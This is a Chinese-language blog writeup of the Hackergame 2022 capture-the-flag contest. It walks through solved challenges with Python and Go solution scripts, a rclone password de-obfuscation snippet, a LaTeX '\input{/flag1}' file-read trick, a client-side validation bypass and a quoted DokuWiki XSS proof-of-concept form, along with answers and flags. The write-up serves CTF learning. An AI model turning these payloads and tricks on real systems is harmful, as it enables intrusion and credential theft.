---
layout: post
title: Hackergame2022 Writeup
date: 2022-10-29 00:00:00
categories: CTF
tags: hackergame CTF
author: Orangelop aka. null.
excerpt: hackergame2022 (第九届中科大信安赛) Writeup
---

* content
{:toc}

## 引言

第一次写writeup，今年比较忙，只做了前一半简单的，估计后两年也是这样了（悲  
苦逼高中牲是这样的  
binary和math真的一题不会，有可能是我比较笨。。。

```text
math: 0
```

## 签到

试了一次，构造`?result=2022`，得到flag

flag为`flag{HappyHacking2022-*CITED DUE TO PRAVIACY*}`  

## 猫咪问答喵

### 第一题

直接百度，答案`2017-03`

### 第二题

百度到这个网页，`https://lug.ustc.edu.cn/wiki/lug/events/sfd/?rev=1474382710`，找到slides中的截图（P15），发现是Kdenlive，不知道的话可以上网搜`KDE环境自带剪辑软件`，并与slides中的GUI截图比对  
故答案为`Kdenlive`

### 第三题

百度直接搜，答案为`12`  

### 第四题

访问linux仓库`https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree`，在`log msg`下搜索`argc`找到最早的commit，得到commit hash：`9e755756e4a22784abfb001688357745ea8ca97c`  
故答案为`9e755756e4a22784abfb001688357745ea8ca97c`  

### 第五题

利用网络资源搜索引擎（例如`search.censys.io`和`shodan.io`），搜索该公钥（`search.censys.io`暂不支持搜索MD5公钥，转用`shodan.io`），搜索得到`sdf.org`  
故答案为`sdf.org`  

### 第六题

在中科大网络通`https://netfee.ustc.edu.cn/faq/`界面发现有一个更新时间`2016.11.28`，此时出校访问国内国际网络的定价已经为20元一个月，在web archive上检索最早的快照，更新时间为2011年左右（记不清了），仍然是20元，说明定价时间早于2012年，搜寻无果后，验证前5题答案正确后进行枚举，大约60s出结果，Python代码如下：  

```python
import requests
import datetime

# 今年用了cookie验证
cookie_dict = {
    "session":"CITED DUE TO PRIVACY"
}
s = requests.Session()
s.get("http://202.38.93.111:10002/",cookies=cookie_dict)

date = datetime.date(2011, 12, 31)
delta = datetime.timedelta(days=1)
while True: #submit form
    datestr = date.strftime("%Y-%m-%d")
    ret = s.post("http://202.38.93.111:10002/", {
        "q1": "2017-03",
        "q2": "Kdenlive",
        "q3": "12",
        "q4": "dcd46d897adb70d63e025f175a00a89797d31a43",
        "q5": "sdf.org",
        "q6": datestr
    },cookies=cookie_dict)
    if "你答对了 5 题喵，但是只够第一个 flag 喵！" in ret.text:
        print(datestr, "❌")
    else:
        print(datestr, "✅", ret.text)
        break
    date = date - delta
```

得到答案`2003-03-01`

flag1: `flag{meowexammeow_772b498346fe0925_76b9b1e49e}`  
flag2：`flag{meowexamfullymeowed!_6c159adddb7f171b_97b7bfecde}`

## 家目录里的秘密

### VSCode里的秘密

在VSCode中的History文件夹`\user_home\user\.config\Code\User\History\2f23f721`内发现`DUGV.c`（VSCode是这样的）  
也可以直接`grep -rn "flag{"`得到结果  
得到flag`flag{finding_everything_through_vscode_config_file_932rjdakd}`

### rclone里的秘密

不会  
但是`\user\.config\rclone\rclone.conf`比较可疑  

```conf
[flag2]
type = ftp
host = ftp.example.com
user = user
pass = tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ
```

**官方题解：**  
可以注意到：
配置中的密码被混淆了；  
但是这个混淆一定是可逆的，因为 rclone 没有问我们要其他的方法去加密存储的密码。在实际连接的时候，它必须要获得原始的密码。  
这个「加密/混淆」功能对应的是`rclone obscure`。如果你的搜索技能够好，可能可以找到解混淆的golang代码。没有找到也没有关系，我们来看一下rclone的代码，搜索`obscure`，可以定位到文件`fs/config/obscure/obscure.go`：  

```go
package obscure

// 省略部分代码

// Reveal an obscured value
func Reveal(x string) (string, error) {
    ciphertext, err := base64.RawURLEncoding.DecodeString(x)
    if err != nil {
        return "", fmt.Errorf("base64 decode failed when revealing password - is it obscured?: %w", err)
    }
    if len(ciphertext) < aes.BlockSize {
        return "", errors.New("input too short when revealing password - is it obscured?")
    }
    buf := ciphertext[aes.BlockSize:]
    iv := ciphertext[:aes.BlockSize]
    if err := crypt(buf, buf, iv); err != nil {
        return "", fmt.Errorf("decrypt failed when revealing password - is it obscured?: %w", err)
    }
    return string(buf), nil
}

// MustReveal reveals an obscured value, exiting with a fatal error if it failed
func MustReveal(x string) string {
    out, err := Reveal(x)
    if err != nil {
        log.Fatalf("Reveal failed: %v", err)
    }
    return out
}
```

解题golang：

```go
package main

import (
        "fmt"
        "github.com/rclone/rclone/fs/config/obscure"
)

func main() {
        fmt.Println(obscure.MustReveal("tqqTq4tmQRDZ0sT_leJr7-WtCiHVXSMrVN49dWELPH1uce-5DPiuDtjBUN3EI38zvewgN5JaZqAirNnLlsQ"))
}
```

## HeiLang

用的`https://github.com/kifuan/helang/commit/15b84e4a03e1e7c17ce9f98caf9f627de240b9f7`里发布的题解（，稍微改改原代码就好了  

```python
from helang.u8 import U8
from helang.quick_runner import quick_run_string
# 你需要将一千行左右的赋值语句前后加上三引号, 里面的句末分号加不加无所谓
CODE = '''
'''
# 这是题目的入口函数
def get_flag(a):
    pass
class MyU8(U8):
    def __setitem__(self, sub, val):
        return super().__setitem__(sub+U8(1), val)
if __name__ == '__main__':
    a = MyU8([0] * 10000)
    quick_run_string(CODE, {'a': a})
    get_flag(a.value)
```

得到flag`flag{6d9ad6e9a6268d96-f6372a22eba85d92}`

## Xcaptcha

没什么好说的  

```python
import requests
import re
import math

url = 'http://202.38.93.111:10047/xcaptcha'
header = {
    'cookie': 'CITED DUE TO PRIVACY'
    }
res = requests.get(url, headers=header)
cookies = res.cookies
cookie = requests.utils.dict_from_cookiejar(cookies)['session']

print(cookie)
res =res.text
a = re.findall('''<label for="captcha1">(.*?) 的结果是？''', res)[0]
b = re.findall('''<label for="captcha2">(.*?) 的结果是？''', res)[0]
c = re.findall('''<label for="captcha3">(.*?) 的结果是？''', res)[0]
print(a)
print(b)
print(c)


def plus(arg):
    i = ''
    m = ''
    q = True
    for num in arg:
        if num != '+' and q is True:

            i = i + num
        elif num == '+':
            q = False
        elif num != '+' and q is False:
            m = m + num
    result = int(i) + int(m)
    return str(result)


d = plus(a)
e = plus(b)
f = plus(c)
print(d)
print(e)
print(f)
header = {
    'cookie': 'session='+cookie
    }
url2 = 'http://202.38.93.111:10047/xcaptcha'
# 'http://202.38.93.111:10047/xcaptcha?captcha1='+d+'&captcha2='+e+'+&captcha3='+f
print(url2)
data = {'captcha1': d, 'captcha2': e, 'captcha3': f}
print(data)
res2 = requests.post(url2, headers=header, data=data).text
print(res2)

```

flag为`flag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_*CITED*}`

## 旅行照片2.0

### 照片分析

直接看EXIF信息即可
flag为`flag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}`

### 社工入门

#### 酒店

在照片内看到标志性圆环建筑`ZOZO xxxRINE STADIUM`，千叶海洋球场261-0022  
Google Maps搜索附近的酒店（只有一家），得到邮编为`261-0021`  

根据EXIF信息（下图）和手机反光推断型号为`Xiaomi Redmi 9T`，google得到`https://www.gsmarena.com/xiaomi_redmi_9t-10670.php`，得到分辨率  
也可以在小米官网`https://www.mi.com/global/redmi-9t/specs`查到
答案为`2610021 2340x1080`

#### 飞机

没做出来  
FR24和FlightAware的免费版playback都只有七天，不能回放更早的，只有会员才能访问  
只知道通过照片拍摄时间`UTC+9 2022年5月14日 18:23:35`可以查到航班信息
答案`NH683，HND => HIJ`  

得到flag`flag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}`  

**官方题解：**  
免费查看历史的 ADS-B 追踪网站还是存在的。比如此处的论坛就提供答案：使用 ADSB Exchange 的回放功能。  

## 猜数字

*我一开始做的时候只是随便F12，构造了一下flag()，没想到就过了*  
观察源码  

```javascript
public String flag() {
    var prefix = System.getenv(FLAG_PREFIX);
    var input = System.getenv(FLAG_SECRET) + ":" + this.raw;
    var digest = SHA256_DIGEST.digest(input.getBytes(StandardCharsets.UTF_8));
    return String.format("flag{%raw%}{%s-%016x}{%endraw%}", prefix, ByteBuffer.wrap(digest).getLong());
    }
```

发现一个flag函数，而且后端没有对输入进行判断，只在前端进行了判断  

```javascript
   private record State(Token token, int passed, int talented, double number, OptionalDouble previous) {
      private static final Random RNG = new SecureRandom();

      private State(Token token) {
         this(token, 0, 0, RNG.nextInt(1, 1000000) * 1e-6, OptionalDouble.empty());
      }

      private void collect(XMLStreamWriter writer) throws XMLStreamException {
         writer.writeStartDocument();
         // <state>
         writer.writeStartElement("state");
         // <name>
         writer.writeStartElement("name");
         writer.writeCharacters(this.token.user());
         writer.writeEndElement();
         // </name><passed>
         writer.writeStartElement("passed");
         writer.writeCharacters(Integer.toString(this.passed));
         writer.writeEndElement();
         // </passed><talented>
         writer.writeStartElement("talented");
         writer.writeCharacters(Integer.toString(this.talented));
         writer.writeEndElement();
         // </talented>
         if (this.previous.isPresent()) {
            // <guess>
            var previous = this.previous.getAsDouble();

            var isLess = previous < this.number - 1e-6 / 2;
            var isMore = previous > this.number + 1e-6 / 2;

            writer.writeStartElement("guess");
            writer.writeAttribute("less", Boolean.toString(isLess));
            writer.writeAttribute("more", Boolean.toString(isMore));
            writer.writeCharacters(Double.toString(previous));
            writer.writeEndElement();
            // </guess>
         }
         if (this.talented > 0) {
            // <flag>
            writer.writeStartElement("flag");
            writer.writeCharacters(this.token.flag());
            writer.writeEndElement();
            // </flag>
         }
         writer.writeEndElement();
         // </state>
      }

      private State update(XMLEventReader reader) throws XMLStreamException {
         var result = Optional.<State>empty();
         var nameStack = new Stack<String>();
         while (reader.hasNext()) {
            var event = reader.nextEvent();
            if (event.isStartElement()) {
               var name = event.asStartElement().getName().getLocalPart();
               nameStack.push(name);
            }
            if (event.isEndElement()) {
               if (nameStack.empty()) throw new XMLStreamException();
               var name = event.asEndElement().getName().getLocalPart();
               if (!name.equals(nameStack.pop())) throw new XMLStreamException();
            }
            if (event.isCharacters()) {
               var path = List.of("state", "guess");
               if (!path.equals(nameStack)) continue;
               if (result.isPresent()) throw new XMLStreamException();
               try {
                  var guess = Double.parseDouble(event.asCharacters().getData());

                  var isLess = guess < this.number - 1e-6 / 2;
                  var isMore = guess > this.number + 1e-6 / 2;

                  var isPassed = !isLess && !isMore;
                  var isTalented = isPassed && this.previous.isEmpty();

                  var newPassed = isPassed ? this.passed + 1 : this.passed;
                  var newTalented = isTalented ? this.talented + 1 : this.talented;
                  var newNumber = isPassed ? RNG.nextInt(1, 1000000) * 1e-6 : this.number;
                  var newPrevious = isPassed ? OptionalDouble.empty() : OptionalDouble.of(guess);

                  result = Optional.of(new State(this.token, newPassed, newTalented, newNumber, newPrevious));
               } catch (NumberFormatException e) {
                  throw new XMLStreamException(e);
               }
            }
         }
         if (!nameStack.empty()) throw new XMLStreamException();
         if (result.isEmpty()) throw new XMLStreamException();
         return result.get();
      }
   }
```

发现不是数字就不会进行判定，输入只要是字母就可以得到flag。  
事情好办多了，直接F12去除前端对输入的判定（`<input>`的`type="number"`和`<button>`的`disabled`），POST过去。

得到flag`flag{gu3ss-n0t-a-numb3r-1nst3ad-CITED}`

## LaTex机器人

### 纯文本

直接`\input{/flag1}`得到答案。

### 特殊字符混入

不会

## flag的痕迹

dokuwiki中不同的 action 对应 URL 参数里面不同的 "do"。再探索一下，就能看到有个 action，似乎不在管理员 UI 的禁用列表里面。
dokuwiki的diff功能不在管理员禁用列表里面，直接访问`http://202.38.93.111:15004/doku.php?id=start&do=diff`得到flag。  
还有可以通过github检索`2022-07-31a "Igor"`的版本更新，发现`https://huntr.dev/bounties/d72a979b-57db-4201-9500-66b49a5c1345/`里提供的xss脚本：  

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://202.38.93.111:15004/doku.php?id=start" method="POST">
      <input type="hidden" name="difftype" value="sidebyside&apos;&quot;&#40;&#41;&amp;&#37;&lt;zzz&gt;&lt;ScRiPt&#32;&gt;alert&#40;9513&#41;&lt;&#47;ScRiPt&gt;" />
      <input type="hidden" name="do" value="diff" />
      <input type="hidden" name="do&#91;diff&#93;" value="1" />
      <input type="hidden" name="id" value="start" />
      <input type="hidden" name="rev2&#91;0&#93;" value="1" />
      <input type="hidden" name="rev2&#91;1&#93;" value="0" />
      <input type="hidden" name="sectok" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

得到flag
*本来想的是去搜一下未修复的漏洞，一不小心就过了*  

## 结语

时间比较紧，只做了这些，希望明年可以多做一些吧  
